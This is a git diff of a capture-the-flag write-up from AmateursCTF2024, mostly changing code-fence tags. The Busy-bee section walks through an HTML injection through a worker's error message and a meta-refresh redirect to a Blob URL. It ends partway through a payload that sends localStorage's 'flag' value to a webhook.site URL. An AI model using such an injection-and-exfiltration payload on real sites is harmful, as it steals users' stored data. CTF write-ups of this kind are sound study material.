@@ -21,7 +21,7 @@ I plugged 1 question id in, and get this
 ![img3](writeups/AmateursCTF2024/image3.png)
 Finally, we can use python script to automate all of these.
 
-```python=
+```python
 import requests
 import re
 import urllib.parse
@@ -51,7 +51,7 @@ for i in range(200):
 ## Busy-bee
 ### Analysis
 After looking around in index.js, I found interesting function which can change HTML.
-```javascript=
+```javascript
 const putLog = (msg) => {
   const p = document.createElement("p");
   p.setHTML(msg);
@@ -59,7 +59,7 @@ const putLog = (msg) => {
 };
 ```
 This function is called in a lot of place, but most of them are safe data. But there is a place where untrusted data is passed in.
-```javascript=
+```javascript
 ...
 } else if (e.data.type === "error") {
         putLog(e.data.msg);
@@ -71,7 +71,7 @@ So we will have HTML injection.
 ### HTML INJECTION
 So how could we get that e.data.type === "error"?
 In worker.js, we have this
-```javascript=
+```javascript
 const tickBee = (e) => {
   try {
     const action = beeFn(e.data.world, e.data.me);
@@ -85,7 +85,7 @@ const tickBee = (e) => {
 };
 ```
 The function beeFn() must throw an error, and the error will be parsed directly in the msg.
-```javascript=
+```javascript
 throw new Error("<b>Injected</b>");
 ```
 ![img4](writeups/AmateursCTF2024/image4.png)
@@ -101,11 +101,11 @@ So by using Blob, we can create a javascript script to make a fetch to our webho
 
 Luckily, meta tag isn't blocked at all, so we can use meta tag to redirect to our blob URL.
 
-```htmlembedded!
+```html
 <meta http-equiv="refresh" content="0;url=???">
 ```
 Combine everthing, we have:
-```javascript=
+```javascript
 const  htmlcontent = `<script>
     fetch('https://webhook.site/e6ac0f5c-05bb-4b0d-ad0b-0a5595a40691?c=' + window.localStorage.getItem('flag'), {
         method: 'GET',
